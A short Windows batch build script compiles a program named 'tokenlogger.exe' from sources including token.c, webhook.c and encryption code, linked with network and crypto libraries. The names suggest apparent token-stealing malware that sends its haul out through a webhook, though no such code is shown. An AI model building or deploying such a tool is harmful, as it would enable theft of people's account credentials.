@echo off
Rem Build the project using tcc. 

tcc\tcc.exe -o tokenlogger.exe -Llib -Iinclude -Iconfig src\simple.c src\aes.o src\token.c src\files.c src\utils.c src\webhook.c config\config.c -lwininet -lkernel32 -luser32 -lcrypto -lcrypt32
Rem move tokenlogger.exe to bin folder
move tokenlogger.exe bin
echo Build complete. tokenlogger.exe has been moved to bin folder.
explorer bin

